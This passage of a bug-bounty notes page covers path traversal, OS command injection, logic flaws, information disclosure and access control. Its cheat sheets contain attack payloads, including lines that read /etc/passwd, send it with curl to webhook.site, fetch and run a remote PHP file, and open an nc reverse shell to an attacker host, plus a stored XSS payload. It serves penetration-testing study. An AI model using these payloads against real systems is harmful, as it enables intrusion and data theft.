On Windows, both `../` and `..\` are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:

```
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

</dd>
</dl>

</details>

<details>
<summary>Bypasses</summary>

<dl>
<dd>

<details>
<summary>File path traversal, traversal sequences blocked with absolute path bypass</summary>

<dl>
<dd>

Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.

If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.

You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.

</dd>
</dl>

</details>

<details>
<summary>File path traversal, traversal sequences stripped non-recursively</summary>

<dl>
<dd>

You might be able to use nested traversal sequences, such as `....//` or `....\/`. These revert to simple traversal sequences when the inner sequence is stripped.

e.g , 1. `....//....//....//etc/passwd`

</dd>
</dl>

</details>

<details>
<summary>File path traversal, traversal sequences stripped with superfluous URL-decode</summary>

<dl>
<dd>

In some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.

e.g, `..%252f..%252f..%252fetc/passwd`

For Burp Suite Professional users, Burp Intruder provides the predefined payload list **Fuzzing - path traversal**. This contains some encoded path traversal sequences that you can try.

</dd>
</dl>

</details>

<details>
<summary>File path traversal, validation of start of path</summary>

<dl>
<dd>

An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example:

```
filename=/var/www/images/../../../etc/passwd
```

</dd>
</dl>

</details>

<details>
<summary>File path traversal, validation of file extension with null byte bypass</summary>

<dl>
<dd>

An application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:

```
filename=../../../etc/passwd%00.png
```

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tips :</summary>

<dl>
<dd>

<details>
<summary>Browser-based application LFI via view-source</summary>

<dl>
<dd>

It could also be a web app which takes your URL and screenshots it for you. You could simply find it anywhere where an URL is rendered on the server side.

Alright, now the actual tip:

Naturally as a bug hunter, you are going to try to access “file:///etc/passwd”, right? But what if it is blacklisted or somehow blocked? Try accessing “view-source:file:///etc/passwd” instead!

The “view-source” feature is often forgotten by developers in blacklists.

</dd>
</dl>

</details>

<details>
<summary>Directory path traversal</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

POST %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpassw HTTP/1.1

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Payload</summary>

<dl>
<dd>

Bypassing WAF by adding multiple slashes to gain SSI/ Path traversal. This is my 2nd successful shot in the dark attempt.

Payload: GET /assets/css///////../../../../../../../../etc/passwd

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>LFI & SSRF & Open Redirect Burp search regex</summary>

<dl>
<dd>

Quick and dirty way to find parameters vulnerable to LFI & Path Traversal & SSRF & Open Redirect:  
Burp Search > Regex  
\?.\*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>OS command injection</summary>

<dl>
<dd>

<details>
<summary>Details</summary>

<dl>
<dd>

OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.

</dd>
</dl>

</details>

<details>
<summary>Useful commnds</summary>

<dl>
<dd>

After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:

|  |  |  |
| --- | --- | --- |
| Purpose of command | Linux | Windows |
| Name of current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |

</dd>
</dl>

</details>

<details>
<summary>Detection steps</summary>

<dl>
<dd>

We can inject some special characters to see if the application blocks anything that could be used for command injection:

```
&
;
Newline (0x0a or \n)
&&
|
||
```

In case the application doesn’t throw any error messages, we can try injecting our command after using one of these delimiters.

```
https://vulnerable-website/endpoint?parameter=1|whoami
```

</dd>
</dl>

</details>

<details>
<summary>Detecting blind OS command injection using time delays</summary>

<dl>
<dd>

1. **Time delays**

Most of the OS command injections are Blind, which doesn’t give any output for the executed command. To verify the vulnerability, after detecting allowed special characters, we can verify the command injection using time delays as below:

```
https://vulnerable-website/endpoint?parameter=x||ping+-c+10+127.0.0.1||
```

**2. Redirecting output**

You can also redirect the output of the command in an output file and then retrieve the file on your browser. A payload similar to the following can be used:

```
https://vulnerable-website/endpoint?
parameter=||whoami>/var/www/images/output.txt||
```

### **3. OOB (Out Of Band) Exploitation**

You can also trigger an OOB network interaction with an external server such as Burp Collaborator. A payload similar to the following can be used:

```
https://vulnerable-website/endpoint?parameter=x||nslookup+burp.collaborator.address||
```

Or you can exfiltrate the output of your command using a payload similar to the following:

```
https://vulnerable-website/endpoint?parameter=||nslookup+`whoami`.burp.collaborator.address||
```

The most common parameters that can be consider while testing for Command injection can be found below:

- cmd

- exec

- command

- execute

- ping

- query

- jump

- code

- reg

- do

- func

- arg

- option

- load

- process

- step

- read

- function

- req

- feature

- exe

- module

- payload

- run

- print

</dd>
</dl>

</details>

<details>
<summary>Exploiting</summary>

<dl>
<dd>

https://portswigger.net/web-security/os-command-injection#exploiting-blind-os-command-injection-by-redirecting-output

</dd>
</dl>

</details>

<details>
<summary>Tip `UserAgent`</summary>

<dl>
<dd>

User-Agent: `curl - v http://BurpCollaborator.com$(id)`

</dd>
</dl>

</details>

<details>
<summary>Tip `command area / upload area`</summary>

<dl>
<dd>

An upload area, command area, input area or anywhere can sometimes give incredible results;

curl http:// \*\*\*. oastify . com -d "data=$(cat /etc/passwd)"

or

curl https:// webhook . site/\*\*\* -d "data=$(cat /etc/passwd)"

</dd>
</dl>

</details>

<details>
<summary>Cheatsheet</summary>

<dl>
<dd>

Special Characters  
&  
;  
Newline (0x0a or \n)  
&&  
|  
||  
command `  
$(command )

Useful Commands: Linux  
whoami  
ifconfig  
ls  
uname -a

Useful Commands: Windows  
whoami  
ipconfig  
dir  
ver

Both Unix and Windows supported  
ls||id; ls ||id; ls|| id; ls || id  
ls|id; ls |id; ls| id; ls | id  
ls&&id; ls &&id; ls&& id; ls && id  
ls&id; ls &id; ls& id; ls & id  
ls %0A id

Time Delay Commands  
& ping -c 10 127.0.0.1 &

Redirecting output  
& whoami > /var/www/images/output.txt &

OOB (Out Of Band) Exploitation  
& nslookup attacker-server.com &  
& nslookup `whoami`.attacker-server.com &

WAF bypasses  
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O  
/tmp/reverse.php %0a php /tmp/reverse.php  
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>  
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Business logic vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>Details</summary>

<dl>
<dd>

Business logic vulnerabilities are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. This potentially enables attackers to manipulate legitimate functionality to achieve a malicious goal. These flaws are generally the result of failing to anticipate unusual application states that may occur and, consequently, failing to handle them safely.

### **Note**

In this context, the term "business logic" simply refers to the set of rules that define how the application operates. As these rules aren't always directly related to a business, the associated vulnerabilities are also known as "application logic vulnerabilities" or simply "logic flaws".

Logic flaws are often invisible to people who aren't explicitly looking for them as they typically won't be exposed by normal use of the application. However, an attacker may be able to exploit behavioral quirks by interacting with the application in ways that developers never intended.

One of the main purposes of business logic is to enforce the rules and constraints that were defined when designing the application or functionality. Broadly speaking, the business rules dictate how the application should react when a given scenario occurs. This includes preventing users from doing things that will have a negative impact on the business or that simply don't make sense.

Flaws in the logic can allow attackers to circumvent these rules. For example, they might be able to complete a transaction without going through the intended purchase workflow. In other cases, broken or non-existent validation of user-supplied data might allow users to make arbitrary changes to transaction-critical values or submit nonsensical input. By passing unexpected values into server-side logic, an attacker can potentially induce the application to do something that it isn't supposed to.

Logic-based vulnerabilities can be extremely diverse and are often unique to the application and its specific functionality. Identifying them often requires a certain amount of human knowledge, such as an understanding of the business domain or what goals an attacker might have in a given context. This makes them difficult to detect using automated vulnerability scanners. As a result, logic flaws are a great target for bug bounty hunters and manual testers in general.

</dd>
</dl>

</details>

<details>
<summary>How do business logic vulnerabilities arise?</summary>

<dl>
<dd>

Business logic vulnerabilities often arise because the design and development teams make flawed assumptions about how users will interact with the application. These bad assumptions can lead to inadequate validation of user input. For example, if the developers assume that users will pass data exclusively via a web browser, the application may rely entirely on weak client-side controls to validate input. These are easily bypassed by an attacker using an intercepting proxy.

Ultimately, this means that when an attacker deviates from the expected user behavior, the application fails to take appropriate steps to prevent this and, subsequently, fails to handle the situation safely.

Logic flaws are particularly common in overly complicated systems that even the development team themselves do not fully understand. To avoid logic flaws, developers need to understand the application as a whole. This includes being aware of how different functions can be combined in unexpected ways. Developers working on large code bases may not have an intimate understanding of how all areas of the application work. Someone working on one component could make flawed assumptions about how another component works and, as a result, inadvertently introduce serious logic flaws. If the developers do not explicitly document any assumptions that are being made, it is easy for these kinds of vulnerabilities to creep into an application.

</dd>
</dl>

</details>

<details>
<summary>Examples</summary>

<dl>
<dd>

1. Excessive trust in client-side controls : `modification of data by attacker in burp`

2. Failing to handle unconventional input : `modification of number , params , amounts etc by attacker in burp`

3. Making flawed assumptions about user behavior

4. Domain-specific flaws e.g, `race condition on gift cards` etc…

5. Providing an encryption oracle

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>information disclosure</summary>

<dl>
<dd>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. Check robot.txt file

2. Use Logger++ extension to analyze leaks found by all burp tools in one place.

</dd>
</dl>

</details>

<details>
<summary>Testing for Information disclosure vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>Fuzzing</summary>

<dl>
<dd>

If you identify interesting parameters, you can try submitting unexpected data types and specially crafted fuzz strings to see what effect this has. Pay close attention; although responses sometimes explicitly disclose interesting information, they can also hint at the application's behavior more subtly. For example, this could be a slight difference in the time taken to process the request. Even if the content of an error message doesn't disclose anything, sometimes the fact that one error case was encountered instead of another one is useful information in itself.

1. Fuzzing HTTP headers would be good start. e.g, one time i found php error that leaked aws key , when i fuzzed for http-headers and one header caused this error `Php-Auth-User: test`

</dd>
</dl>

</details>

<details>
<summary>Using Burp Scanner</summary>

<dl>
<dd>

Burp Suite Professional users have the benefit of Burp Scanner. This provides live scanning features for auditing items while you browse, or you can schedule automated scans to crawl and audit the target site on your behalf. Both approaches will automatically flag many information disclosure vulnerabilities for you. For example, Burp Scanner will alert you if it finds sensitive information such as private keys, email addresses, and credit card numbers in a response. It will also identify any backup files, directory listings, and so on.

</dd>
</dl>

</details>

<details>
<summary>Using Burp's engagement tools</summary>

<dl>
<dd>

Burp provides several engagement tools that you can use to find interesting information in the target website more easily. You can access the engagement tools from the context menu - just right-click on any HTTP message, Burp Proxy entry, or item in the site map and go to "Engagement tools".

The following tools are particularly useful in this context :

### 1. **Search**

You can use this tool to look for any expression within the selected item. You can fine-tune the results using various advanced search options, such as regex search or negative search. This is useful for quickly finding occurrences (or absences) of specific keywords of interest.

### 2. **Find comments**

You can use this tool to quickly extract any developer comments found in the selected item. It also provides tabs to instantly access the HTTP request/response cycle in which each comment was found.

### 3. **Discover content**

You can use this tool to identify additional content and functionality that is not linked from the website's visible content. This can be useful for finding additional directories and files that won't necessarily appear in the site map automatically.

</dd>
</dl>

</details>

<details>
<summary>Engineering informative responses</summary>

<dl>
<dd>

Verbose error messages can sometimes disclose interesting information while you go about your normal testing workflow. However, by studying the way error messages change according to your input, you can take this one step further. In some cases, you will be able to manipulate the website in order to extract arbitrary data via an error message.

There are numerous methods for doing this depending on the particular scenario you encounter. One common example is to make the application logic attempt an invalid action on a specific item of data. For example, submitting an invalid parameter value might lead to a stack trace or debug response that contains interesting details. You can sometimes cause error messages to disclose the value of your desired data in the response

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Common sources of information disclosure</summary>

<dl>
<dd>

<details>
<summary>Files for web crawlers</summary>

<dl>
<dd>

Many websites provide files at /robots.txt and /sitemap.xml to help crawlers navigate their site. Among other things, these files often list specific directories that the crawlers should skip, for example, because they may contain sensitive information.

As these files are not usually linked from within the website, they may not immediately appear in Burp's site map. However, it is worth trying to navigate to /robots.txt or /sitemap.xml manually to see if you find anything of use.

</dd>
</dl>

</details>

<details>
<summary>Directory listings</summary>

<dl>
<dd>

Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.

Directory listings themselves are not necessarily a security vulnerability. However, if the website also fails to implement proper access control, leaking the existence and location of sensitive resources in this way is clearly an issue.

</dd>
</dl>

</details>

<details>
<summary>Developer comments</summary>

<dl>
<dd>

During development, in-line HTML comments are sometimes added to the markup. These comments are typically stripped before changes are deployed to the production environment. However, comments can sometimes be forgotten, missed, or even left in deliberately because someone wasn't fully aware of the security implications. Although these comments are not visible on the rendered page, they can easily be accessed using Burp, or even the browser's built-in developer tools.

Occasionally, these comments contain information that is useful to an attacker. For example, they might hint at the existence of hidden directories or provide clues about the application logic.

</dd>
</dl>

</details>

<details>
<summary>Error messages</summary>

<dl>
<dd>

One of the most common causes of information disclosure is verbose error messages. As a general rule, you should pay close attention to all error messages you encounter during auditing.

The content of error messages can reveal information about what input or data type is expected from a given parameter. This can help you to narrow down your attack by identifying exploitable parameters. It may even just prevent you from wasting time trying to inject payloads that simply won't work.

Verbose error messages can also provide information about different technologies being used by the website. For example, they might explicitly name a template engine, database type, or server that the website is using, along with its version number. This information can be useful because you can easily search for any documented exploits that may exist for this version. Similarly, you can check whether there are any common configuration errors or dangerous default settings that you may be able to exploit. Some of these may be highlighted in the official documentation.

You might also discover that the website is using some kind of open-source framework. In this case, you can study the publicly available source code, which is an invaluable resource for constructing your own exploits.

Differences between error messages can also reveal different application behavior that is occurring behind the scenes. Observing differences in error messages is a crucial aspect of many techniques, such as SQL injection, username enumeration, and so on.

</dd>
</dl>

</details>

<details>
<summary>Debugging Data</summary>

<dl>
<dd>

For debugging purposes, many websites generate custom error messages and logs that contain large amounts of information about the application's behavior. While this information is useful during development, it is also extremely useful to an attacker if it is leaked in the production environment.

Debug messages can sometimes contain vital information for developing an attack, including:

- Values for key session variables that can be manipulated via user input

- Hostnames and credentials for back-end components

- File and directory names on the server

- Keys used to encrypt data transmitted via the client

Debugging information may sometimes be logged in a separate file. If an attacker is able to gain access to this file, it can serve as a useful reference for understanding the application's runtime state. It can also provide several clues as to how they can supply crafted input to manipulate the application state and control the information received.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>User account pages</summary>

<dl>
<dd>

By their very nature, a user's profile or account page usually contains sensitive information, such as the user's email address, phone number, API key, and so on. As users normally only have access to their own account page, this does not represent a vulnerability in itself. However, some websites contain logic flaws that potentially allow an attacker to leverage these pages in order to view other users' data.

For example, consider a website that determines which user's account page to load based on a `user` parameter.

```
GET /user/personal-info?user=carlos
```

Most websites will take steps to prevent an attacker from simply changing this parameter to access arbitrary users' account pages. However, sometimes the logic for loading individual items of data is not as robust.

An attacker may not be able to load another users' account page entirely, but the logic for fetching and rendering the user's registered email address, for example, might not check that the `user` parameter matches the user that is currently logged in. In this case, simply changing the `user` parameter would allow an attacker to display arbitrary users' email addresses on their own account page.

</dd>
</dl>

</details>

<details>
<summary>Source code disclosure via backup files</summary>

<dl>
<dd>

Obtaining source code access makes it much easier for an attacker to understand the application's behavior and construct high-severity attacks. Sensitive data is sometimes even hard-coded within the source code. Typical examples of this include API keys and credentials for accessing back-end components.

If you can identify that a particular open-source technology is being used, this provides easy access to a limited amount of source code.

Occasionally, it is even possible to cause the website to expose its own source code. When mapping out a website, you might find that some source code files are referenced explicitly. Unfortunately, requesting them does not usually reveal the code itself. When a server handles files with a particular extension, such as .php, it will typically execute the code, rather than simply sending it to the client as text. However, in some situations, you can trick a website into returning the contents of the file instead. For example, text editors often generate temporary backup files while the original file is being edited. These temporary files are usually indicated in some way, such as by appending a tilde (~) to the filename or adding a different file extension. Requesting a code file using a backup file extension can sometimes allow you to read the contents of the file in the response.

</dd>
</dl>

</details>

<details>
<summary>Source code disclosure via backup files</summary>

<dl>
<dd>

Once an attacker has access to the source code, this can be a huge step towards being able to identify and exploit additional vulnerabilities that would otherwise be almost impossible. One such example is insecure deserialization.

</dd>
</dl>

</details>

<details>
<summary>Information disclosure due to insecure configuration</summary>

<dl>
<dd>

Websites are sometimes vulnerable as a result of improper configuration. This is especially common due to the widespread use of third-party technologies, whose vast array of configuration options are not necessarily well-understood by those implementing them.

In other cases, developers might forget to disable various debugging options in the production environment. For example, the HTTP TRACE method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the TRACE method by echoing in the response the exact request that was received. This behavior is often harmless, but occasionally leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies.

</dd>
</dl>

</details>

<details>
<summary>Version control history</summary>

<dl>
<dd>

Virtually all websites are developed using some form of version control system, such as Git. By default, a Git project stores all of its version control data in a folder called .git. Occasionally, websites expose this directory in the production environment. In this case, you might be able to access it by simply browsing to /.git.

While it is often impractical to manually browse the raw file structure and contents, there are various methods for downloading the entire .git directory. You can then open it using your local installation of Git to gain access to the website's version control history. This may include logs containing committed changes and other interesting information.

This might not give you access to the full source code, but comparing the diff will allow you to read small snippets of code. As with any source code, you might also find sensitive data hard-coded within some of the changed lines.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Access Control Issues</summary>

<dl>
<dd>

<details>
<summary>What is access control?</summary>

<dl>
<dd>

Access control is the application of constraints on who or what is authorized to perform actions or access resources. In the context of web applications, access control is dependent on authentication and session management:

- Authentication confirms that the user is who they say they are.

- Session management identifies which subsequent HTTP requests are being made by that same user.

- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.

Broken access controls are common and often present a critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation. Access control design decisions have to be made by humans so the potential for errors is high.

1. Vertical access controls  
   Vertical access controls are mechanisms that restrict access to sensitive functionality to specific types of users. With vertical access controls, different types of users have access to different application functions. For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions. Vertical access controls can be more fine-grained implementations of security models designed to enforce business policies such as separation of duties and least privilege.

2. Horizontal access controls  
   Horizontal access controls are mechanisms that restrict access to resources to specific users. With horizontal access controls, different users have access to a subset of resources of the same type. For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user.

3. Context-dependent access controls  
   Context-dependent access controls restrict access to functionality and resources based upon the state of the application or the user's interaction with it. Context-dependent access controls prevent a user performing actions in the wrong order. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment.

</dd>
</dl>

</details>

<details>
<summary>Access control security models :</summary>

<dl>
<dd>

What are access control security models?

An access control security model is a formally defined definition of a set of access control rules that is independent of technology or implementation platform. Access control security models are implemented within operating systems, networks, database management systems and back office, application and web server software. Various access control security models have been devised over the years to match access control policies to business or organizational rules and changes in technology.

1. Programmatic access control  
   With programmatic access control, a matrix of user privileges is stored in a database or similar and access controls are applied programmatically with reference to this matrix. This approach to access control can include roles or groups or individual users, collections or workflows of processes and can be highly granular.

2. Discretionary access control (DAC)  
   With discretionary access control, access to resources or functions is constrained based upon users or named groups of users. Owners of resources or functions have the ability to assign or delegate access permissions to users. This model is highly granular with access rights defined to an individual resource or function and user. Consequently the model can become very complex to design and manage.

3. Mandatory access control (MAC)  
   Mandatory access control is a centrally controlled system of access control in which access to some object (a file or other resource) by a subject is constrained. Significantly, unlike DAC the users and owners of resources have no capability to delegate or modify access rights for their resources. This model is often associated with military clearance-based systems.

4. Role-based access control (RBAC)  
   With role-based access control, named roles are defined to which access privileges are assigned. Users are then assigned to single or multiple roles. RBAC provides enhanced management over other access control models and if properly designed sufficient granularity to provide manageable access control in complex applications. For example, the purchase clerk might be defined as a role with access permissions for a subset of purchase ledger functionality and resources. As employees leave or join an organization then access control management is simplified to defining or revoking membership of the purchases clerk role. RBAC is most effective when there are sufficient roles to properly invoke access controls but not so many as to make the model excessively complex and unwieldy to manage.

</dd>
</dl>

</details>

<details>
<summary>Examples</summary>

<dl>
<dd>

<details>
<summary>Vertical privilege escalation</summary>

<dl>
<dd>

If a user can gain access to functionality that they are not permitted to access then this is vertical privilege escalation. For example, if a non-administrative user can gain access to an admin page where they can delete user accounts, then this is vertical privilege escalation.

<details>
<summary>Unprotected functionality</summary>

<dl>
<dd>

At its most basic, vertical privilege escalation arises where an application does not enforce any protection for sensitive functionality. For example, administrative functions might be linked from an administrator's welcome page but not from a user's welcome page. However, a user might be able to access the administrative functions by browsing to the relevant admin URL.

For example, a website might host sensitive functionality at the following URL:

https://insecure-website.com/admin  
This might be accessible by any user, not only administrative users who have a link to the functionality in their user interface. In some cases, the administrative URL might be disclosed in other locations, such as the robots.txt file:

https://insecure-website.com/robots.txt  
Even if the URL isn't disclosed anywhere, an attacker may be able to use a wordlist to brute-force the location of the sensitive functionality.

In some cases, sensitive functionality is concealed by giving it a less predictable URL. This is an example of so-called "security by obscurity". However, hiding sensitive functionality does not provide effective access control because users might discover the obfuscated URL in a number of ways.

Imagine an application that hosts administrative functions at the following URL:

https://insecure-website.com/administrator-panel-yb556  
This might not be directly guessable by an attacker. However, the application might still leak the URL to users. The URL might be disclosed in JavaScript that constructs the user interface based on the user's role:

`<script>  
var isAdmin = false;  
if (isAdmin) {  
...  
var adminPanelTag = document.createElement('a');  
adminPanelTag.setAttribute('``https://insecure-website.com/administrator-panel-yb556``');  
adminPanelTag.innerText = 'Admin panel';  
...  
}  
</script>`  
This script adds a link to the user's UI if they are an admin user. However, the script containing the URL is visible to all users regardless of their role.

</dd>
</dl>

</details>

<details>
<summary>Parameter-based access control methods</summary>

<dl>
<dd>

Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location. This could be:

- A hidden field.

- A cookie.

- A preset query string parameter.

The application makes access control decisions based on the submitted value. For example:

https://insecure-website.com/login/home.jsp?admin=truehttps://insecure-website.com/login/home.jsp?role=1  
This approach is insecure because a user can modify the value and access functionality they're not authorized to, such as administrative functions.

</dd>
</dl>

</details>

<details>
<summary>Broken access control resulting from platform misconfiguration</summary>

<dl>
<dd>

Some applications enforce access controls at the platform layer. they do this by restricting access to specific URLs and HTTP methods based on the user's role. For example, an application might configure a rule as follows:

`DENY: POST, /admin/deleteUser, managers`  
This rule denies access to the POST method on the URL /admin/deleteUser, for users in the managers group. Various things can go wrong in this situation, leading to access control bypasses.

Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as X-Original-URL and X-Rewrite-URL. If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:

`POST / HTTP/1.1  
X-Original-URL: /admin/deleteUser  
...`

An alternative attack relates to the HTTP method used in the request. The front-end controls described in the previous sections restrict access based on the URL and HTTP method. Some websites tolerate different HTTP request methods when performing an action. If an attacker can use the GET (or another) method to perform actions on a restricted URL, they can bypass the access control that is implemented at the platform layer.

</dd>
</dl>

</details>

<details>
<summary>Broken access control resulting from URL-matching discrepancies</summary>

<dl>
<dd>

Websites can vary in how strictly they match the path of an incoming request to a defined endpoint. For example, they may tolerate inconsistent capitalization, so a request to /ADMIN/DELETEUSER may still be mapped to the /admin/deleteUser endpoint. If the access control mechanism is less tolerant, it may treat these as two different endpoints and fail to enforce the correct restrictions as a result.

Similar discrepancies can arise if developers using the Spring framework have enabled the useSuffixPatternMatch option. This allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension. In other words, a request to /admin/deleteUser.anything would still match the /admin/deleteUser pattern. Prior to Spring 5.3, this option is enabled by default.

On other systems, you may encounter discrepancies in whether /admin/deleteUser and /admin/deleteUser/ are treated as distinct endpoints. In this case, you may be able to bypass access controls by appending a trailing slash to the path.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Horizontal privilege escalation</summary>

<dl>
<dd>

Horizontal privilege escalation occurs if a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee can access the records of other employees as well as their own, then this is horizontal privilege escalation.

Horizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. For example, a user might access their own account page using the following URL:

```
https://insecure-website.com/myaccount?id=123
```

If an attacker modifies the `id` parameter value to that of another user, they might gain access to another user's account page, and the associated data and functions.

`This is an example of an insecure direct object reference (IDOR) vulnerability. This type of vulnerability arises where user-controller parameter values are used to access resources or functions directly.`

In some applications, the exploitable parameter does not have a predictable value. For example, instead of an incrementing number, an application might use globally unique identifiers (GUIDs) to identify users. This may prevent an attacker from guessing or predicting another user's identifier. However, the GUIDs belonging to other users might be disclosed elsewhere in the application where users are referenced, such as user messages or reviews.

In some cases, an application does detect when the user is not permitted to access the resource, and returns a redirect to the login page. However, the response containing the redirect might still include some sensitive data belonging to the targeted user, so the attack is still successful.

</dd>
</dl>

</details>

<details>
<summary>Horizontal to vertical privilege escalation</summary>

<dl>
<dd>

Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user. For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user. If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.

An attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation:

```
https://insecure-website.com/myaccount?id=456
```

If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality.

</dd>
</dl>

</details>

<details>
<summary>Access control vulnerabilities in multi-step processes</summary>

<dl>
<dd>

Many websites implement important functions over a series of steps. This is common when:

A variety of inputs or options need to be captured.  
The user needs to review and confirm details before the action is performed.  
For example, the administrative function to update user details might involve the following steps:

Load the form that contains details for a specific user.  
Submit the changes.  
Review the changes and confirm.  
Sometimes, a website will implement rigorous access controls over some of these steps, but ignore others. Imagine a website where access controls are correctly applied to the first and second steps, but not to the third step. The website assumes that a user will only reach step 3 if they have already completed the first steps, which are properly controlled. An attacker can gain unauthorized access to the function by skipping the first two steps and directly submitting the request for the third step with the required parameters.

</dd>
</dl>

</details>

<details>
<summary>Referer-based access control</summary>

<dl>
<dd>

Some websites base access controls on the Referer header submitted in the HTTP request. The Referer header can be added to requests by browsers to indicate which page initiated a request.

For example, an application robustly enforces access control over the main administrative page at /admin, but for sub-pages such as /admin/deleteUser only inspects the Referer header. If the Referer header contains the main /admin URL, then the request is allowed.

In this case, the Referer header can be fully controlled by an attacker. This means that they can forge direct requests to sensitive sub-pages by supplying the required Referer header, and gain unauthorized access.

</dd>
</dl>

</details>

<details>
<summary>Location-based access control</summary>

<dl>
<dd>

Some websites enforce access controls based on the user's geographical location. This can apply, for example, to banking applications or media services where state legislation or business restrictions apply. These access controls can often be circumvented by the use of web proxies, VPNs, or manipulation of client-side geolocation mechanisms.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip on finding access control bugs</summary>

<dl>
<dd>

1. Firstly I have two users, one with high privileges (admin), and one with low privileges (joe). I log in as the admin first, and use all the functionality.

2. Whenever I do something that should be reserved for an administrator, I send the request over to Repeater.

3. Once I have a stack of them, I get the cookies from the “joe” account and insert them into those requests. I send them and analyze the difference in response to see if it worked. If it did, I report it!

4. Then, I do the same thing but without any cookies or session tokens to see if it works unauthenticated.

(Authorize Burp plugin is useful here)

</dd>
</dl>

</details>

<details>
<summary>In discount param</summary>

<dl>
<dd>

(1,alert)(7\*7)],

</dd>
</dl>

</details>

<details>
<summary>API KEYS misconfig in revoking</summary>

<dl>
<dd>

Bug: After deactivated main account - sub account is still working lead to access the main account data through API key. (Private program)

</dd>
</dl>

</details>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

1. Turn on your browser and your burpsuite. Surf the program as an authenticated user.

2. Browse all the possible endpoints. Click on all possible functionalities.

3. Surf for as many days as possible. Don't throw your burpsuite project file.

4. Go to HTTP history. Copy all URLs by selecting all requests.

5. Make a python script or use httpx or custom nuclei template to make requests to all the URLs.

6. Grep for 200 or 201 like responses.

7. Result: Previously in the browser, you have surfed all the endpoints and functionalities as a logged in user. But, in the next case you are making unauthenticated requests.

8. Burp extension Autorize can also be used for this purpose. But, this will do it for you in live mode.

</dd>
</dl>

</details>

<details>
<summary>Sometimes input restriction is client-side only</summary>

<dl>
<dd>

Tried to input XSS payload through proxy.

Phone Number Field-  
Through Browser: Only Numeric Digits allowed (Alphabet and Special Characters Blocked)

Through Burp Proxy: 123"><svg+onload=prompt(document.domain)> (Stored XSS)

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

If you find invite link or private file link that you can share, always try to put that link in wayback if you found result , you will be able access private things.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
